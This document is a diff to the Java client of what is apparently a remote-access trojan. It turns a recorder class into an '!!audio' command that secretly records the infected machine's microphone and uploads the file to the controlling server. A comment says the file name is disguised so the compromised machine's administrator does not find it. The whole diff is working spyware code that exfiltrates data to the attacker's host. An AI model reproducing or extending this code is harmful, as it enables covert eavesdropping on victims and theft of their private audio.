@@ -2,8 +2,12 @@ package com.ghostj.client.func;
 
 import com.ghostj.client.cmd.AbstractFunc;
 import com.ghostj.client.cmd.AbstractProcessor;
+import com.ghostj.client.conn.HandleConn;
+import com.ghostj.client.core.ClientMain;
+import com.rft.core.client.FileSender;
 
 import java.io.File;
+import java.util.Date;
 import javax.sound.sampled.AudioFileFormat;
 import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioInputStream;
@@ -11,25 +15,7 @@ import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.TargetDataLine;
 
-public class FuncRecorder implements AbstractFunc {
-    static  AbstractProcessor processor;
-
-    private static final long serialVersionUID = 1L;
-    AudioFormat audioFormat;
-    TargetDataLine targetDataLine;
-
-    public void run(String[] params, String cmd, AbstractProcessor processor) {
-        captureAudio();//调用录音方法
-        try{
-            Thread.sleep(5000);
-            targetDataLine.stop();
-            targetDataLine.close();
-        }catch (Exception e){
-            e.printStackTrace();
-        }
-
-    }
-
+public class FuncAudio implements AbstractFunc {
     @Override
     public String getFuncName() {
         return "!!audio";
@@ -47,10 +33,45 @@ public class FuncRecorder implements AbstractFunc {
 
     @Override
     public int getMinParamsAmount() {
-        return 1;
+        return 0;
     }
 
-    public void captureAudio(){
+    public static boolean recording=false;
+    public void run(String[] params, String cmd, AbstractProcessor processor) {
+        if (recording){
+            HandleConn.writeToServerIgnoreException("Recording...");
+            return;
+        }
+        recording=true;
+        captureAudio();//调用录音方法
+        try{
+            long length=5000;
+            try{
+                length=Long.parseLong(params[0]);
+            }catch (Exception ignored){}
+            HandleConn.writeToServerIgnoreException("录音开始,时长:"+length+"ms\n");
+            Thread.sleep(length);
+            targetDataLine.stop();
+            targetDataLine.close();
+            HandleConn.writeToServerIgnoreException("录音完成 ");
+            FileSender.sendFile(new File("audio.wMASKav"),
+                    "audio/"+ ClientMain.name,
+                    "audio" + new Date().getTime(),
+                    HandleConn.ip,
+                    HandleConn.rft_port);
+            HandleConn.writeToServerIgnoreException("上传完成\n");
+        }catch (Exception e){
+            HandleConn.writeToServerIgnoreException(ClientMain.getErrorInfo(e)+"\n");
+        }
+        recording=false;
+
+    }
+
+    /*显式声明为private以标明其只在此对象中被调用，即自然上可以同时存在多个录音对象*/
+    private AudioFormat audioFormat;
+    private TargetDataLine targetDataLine;
+
+    public void captureAudio(){//录音
         try {
             audioFormat = getAudioFormat();//构造具有线性 PCM 编码和给定参数的 AudioFormat。
             DataLine.Info dataLineInfo = new DataLine.Info(TargetDataLine.class, audioFormat);
@@ -63,13 +84,12 @@ public class FuncRecorder implements AbstractFunc {
             new CaptureThread().start();
             //开启线程
         } catch (Exception e){
-            e.printStackTrace();
-            System.exit(0);
+            HandleConn.writeToServerIgnoreException("创建录音上下文异常:"+ClientMain.getErrorInfo(e)+"\n");
         }
     }
 
     private AudioFormat getAudioFormat() {
-        float sampleRate = 8000F;
+        float sampleRate = 16000F;
         // 8000,11025,16000,22050,44100 采样率
         int sampleSizeInBits = 8;
         // 8,16 每个样本中的位数
@@ -85,13 +105,11 @@ public class FuncRecorder implements AbstractFunc {
 
     class CaptureThread extends Thread {
         public void run() {
-            AudioFileFormat.Type fileType = null;
             //指定的文件类型
-            File audioFile = null;
             //设置文件类型和文件扩展名
             //根据选择的单选按钮。
-            fileType = AudioFileFormat.Type.WAVE;
-            audioFile = new File("test.wav");
+            AudioFileFormat.Type fileType = AudioFileFormat.Type.WAVE;
+            File audioFile = new File("audio.wMASKav");//MASK标记字防止被肉鸡管理员发现此文件，此标记字会在server被自动删除
             try {
                 targetDataLine.open(audioFormat);
                 //format - 所需音频格式
@@ -102,9 +120,8 @@ public class FuncRecorder implements AbstractFunc {
                 //stream - 包含要写入文件的音频数据的音频输入流
                 //fileType - 要写入的音频文件的种类
                 //out - 应将文件数据写入其中的外部文件
-
             } catch (Exception e) {
-                e.printStackTrace();
+                HandleConn.writeToServerIgnoreException("录音异常:"+ClientMain.getErrorInfo(e)+"\n");
             }
         }
     }
